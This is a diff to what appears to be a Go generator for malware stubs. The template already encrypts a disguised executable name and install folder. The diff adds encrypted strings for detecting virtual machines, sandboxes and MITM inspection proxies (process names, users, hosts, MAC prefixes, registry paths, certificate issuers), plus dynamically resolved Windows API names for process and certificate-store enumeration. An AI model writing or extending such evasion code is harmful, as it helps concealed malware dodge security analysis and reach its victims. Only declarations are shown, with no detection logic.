@@ -543,6 +543,30 @@ var encXdgOpen = []byte{%s}
 var encDisguisedExeName = []byte{%s}
 var encDisguiseDir = []byte{%s}
 var encLocalAppDataEnv = []byte{%s}
+var encVmProcesses = []byte{%s}
+var encSandboxProcs = []byte{%s}
+var encVmFiles = []byte{%s}
+var encSandboxUsers = []byte{%s}
+var encSandboxHosts = []byte{%s}
+var encVmMacPrefixes = []byte{%s}
+var encMitmProcs = []byte{%s}
+var encMitmIssuers = []byte{%s}
+var encVmRegPaths = []byte{%s}
+var encGlobalMemoryStatusExName = []byte{%s}
+var encGetDiskFreeSpaceExWName = []byte{%s}
+var encGetTickCount64Name = []byte{%s}
+var encRegOpenKeyExWName = []byte{%s}
+var encRegCloseKeyName = []byte{%s}
+var encGetSystemMetricsName = []byte{%s}
+var encCreateToolhelp32SnapshotName = []byte{%s}
+var encProcess32FirstWName = []byte{%s}
+var encProcess32NextWName = []byte{%s}
+var encCrypt32Dll = []byte{%s}
+var encCertOpenSystemStoreWName = []byte{%s}
+var encCertEnumCertsName = []byte{%s}
+var encCertGetNameStringWName = []byte{%s}
+var encCertFreeCertCtxName = []byte{%s}
+var encCertCloseStoreName = []byte{%s}
 
 var decryptionKey = []byte("%s")
 `,
@@ -667,6 +691,30 @@ var decryptionKey = []byte("%s")
 		g.EncDisguisedExeName,
 		g.EncDisguiseDir,
 		g.EncLocalAppDataEnv,
+		g.EncVmProcesses,
+		g.EncSandboxProcs,
+		g.EncVmFiles,
+		g.EncSandboxUsers,
+		g.EncSandboxHosts,
+		g.EncVmMacPrefixes,
+		g.EncMitmProcs,
+		g.EncMitmIssuers,
+		g.EncVmRegPaths,
+		g.EncGlobalMemoryStatusEx,
+		g.EncGetDiskFreeSpaceExW,
+		g.EncGetTickCount64,
+		g.EncRegOpenKeyExW,
+		g.EncRegCloseKey,
+		g.EncGetSystemMetrics,
+		g.EncCreateToolhelp32Snapshot,
+		g.EncProcess32FirstW,
+		g.EncProcess32NextW,
+		g.EncCrypt32Dll,
+		g.EncCertOpenSystemStoreW,
+		g.EncCertEnumCerts,
+		g.EncCertGetNameStringW,
+		g.EncCertFreeCertCtx,
+		g.EncCertCloseStore,
 		g.XorKeyLiteral,
 	)), nil
 }
